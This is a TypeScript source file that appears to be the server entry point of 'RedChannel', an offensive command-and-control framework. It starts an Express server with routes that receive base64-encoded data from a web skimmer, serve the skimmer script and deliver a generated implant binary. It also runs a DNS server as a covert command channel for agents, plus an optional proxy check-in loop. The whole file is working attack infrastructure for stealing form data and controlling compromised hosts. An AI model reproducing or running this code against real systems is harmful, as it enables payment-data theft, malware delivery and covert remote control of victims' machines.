import chalk from "chalk";
import * as dnsd from "dnsd2";
import * as fs from "fs";
import { Command as Commander } from "commander";
import express from "express";

import RedChannel from "./lib/redchannel";
import UserInterface from "./lib/ui";
import Logger from "./lib/logger";
import { Config, Constants, Banner, emsg } from "./utils/utils";

const cli = new Commander();
cli.version(Constants.VERSION, "-v, --version")
    .usage("[options]")
    .option("-c, --config <path/to/rc.conf>", "specify a redchannel config file", Config.DEFAULT_CONFIG_FILE)
    .option("-p, --password <password>", "specify the password or set via env:RC_PASSWORD")
    .option("-c, --domain <domain>", "specify the c2 domain", "")
    .option("-B, --ip [ip]", "bind dns c2 to ip", "")
    .option("-P, --port [port]", "listen for dns on a specific port", "")
    .option("-W, --web-ip [ip]", "bind web server to ip", "")
    .option("-Y, --web-port [port]", "listen for web on a specific port", "")
    .option("-I, --agent-interval [ms]", "checkin interval for the agent", "")
    .option("-R, --agent-resolver [ip:port]", "set the resolver to use for the agent", "")
    .option("-d, --debug", "enable debug", false)
    .parse(process.argv);

// env password takes priority over commandline
const cliPassword = process.env.RC_PASSWORD ?? cli.getOptionValue("password");
if (!cliPassword) {
    new Logger().error("please specify a master c2 password via command-lie or environment variable, see '--help'");
    process.exit(1);
}

const cliDomain = cli.getOptionValue("domain");
const cliConfigFilePath = cli.getOptionValue("config");
const cliConfig = {
    c2: {
        dns_ip: cli.getOptionValue("ip") || "127.0.0.1",
        dns_port: Number(cli.getOptionValue("port")) || 53,
        web_ip: cli.getOptionValue("webIp") || "127.0.0.1",
        web_port: cli.getOptionValue("webPort") || 4321,
        interval: cli.getOptionValue("agentInterval") || 5000,
    },
    implant: {
        resolver: cli.getOptionValue("agentResolver") || "8.8.8.8:53",
    },
};

const cliDebug = cli.getOptionValue("debug") ?? false;

let redchannel: RedChannel;
try {
    redchannel = new RedChannel(cliDebug, cliDomain, cliPassword, cliConfig, cliConfigFilePath);
} catch (ex) {
    new Logger().error(`Error instantiating RedChannel: ${emsg(ex)}`);
    console.log(ex);
    process.exit(1);
}

const ui = new UserInterface(redchannel);
redchannel.log = ui;

ui.msg(chalk.redBright(Banner));

const webServer = express();

/**
 * Skimmer routes
 */

// incoming skimmer data
webServer.get(redchannel.modules.skimmer.config.data_route, (request: express.Request, response: express.Response) => {
    ui.debug(`incoming skimmer raw data: ${JSON.stringify(request.query)}`);

    const decodedData = Buffer.from(request.query.id, "base64").toString();
    ui.success(`incoming skimmer data:\n${decodedData}`);
    response.send("OK");
});

// serve skimmer payload
webServer.get(redchannel.modules.skimmer.config.payload_route, (request: express.Request, response: express.Response) => {
    let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
    ui.warn(`incoming request for skimmer payload from ${ip}`);
    response.send(redchannel.modules.skimmer.payload);
});

// agent binary payload
webServer.get(redchannel.modules.c2.config.binary_route, (request: express.Request, response: express.Response) => {
    let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
    ui.warn(`incoming request for agent binary from ${ip}`);
    try {
        if (!fs.existsSync(redchannel.modules.implant.outputFile)) throw new Error(`agent binary not found on disk, did you generate an implant?`);
        response.sendFile(redchannel.modules.implant.outputFile);
        ui.warn(`agent binary sent to ${ip}`);
    } catch (ex) {
        ui.error(`agent binary not sent to ${ip}, err: ${emsg(ex)}`);
        response.status(404).send("404 File Not Found");
    }
});

webServer.listen(redchannel.modules.c2.config.web_port, redchannel.modules.c2.config.web_ip, (err) => {
    if (err) return ui.error(`failed to start web server: ${err}`);
    ui.info(`c2-web listening on: ${redchannel.modules.c2.config.web_ip}:${redchannel.modules.c2.config.web_port}`);
});

/**
 * DNS channel
 */

process.on("uncaughtException", (ex, err) => {
    ui.error(`process error: ${emsg(ex)}`);
});

const dnsServer = dnsd.createServer(redchannel.c2MessageHandler.bind(redchannel));

dnsServer.on("error", (ex, err) => {
    ui.error(`dns server error: ${emsg(ex)}, msg: ${emsg(err)}`);
});
const c2Domain = redchannel.modules.c2.config.domain;
// prettier-ignore
dnsServer
    .zone(
        c2Domain,
        "ns1." + c2Domain,
        "root@" + c2Domain,
        "now",
        "2h",
        "30m",
        "2w",
        "10m"
    )
    .listen(redchannel.modules.c2.config.dns_port, redchannel.modules.c2.config.dns_ip);

ui.info(`c2-dns listening on: ${redchannel.modules.c2.config.dns_ip}:${redchannel.modules.c2.config.dns_port}, c2 domain: ${c2Domain}`);

if (redchannel.modules.proxy.config.enabled) {
    ui.info(`c2-proxy enabled, checkin at interval: ${redchannel.modules.proxy.config.interval}ms`);
    redchannel.modules.proxy.proxyFetchLoop();
} else {
    ui.info(`c2-proxy is disabled, see 'use proxy' -> 'help'`);
}
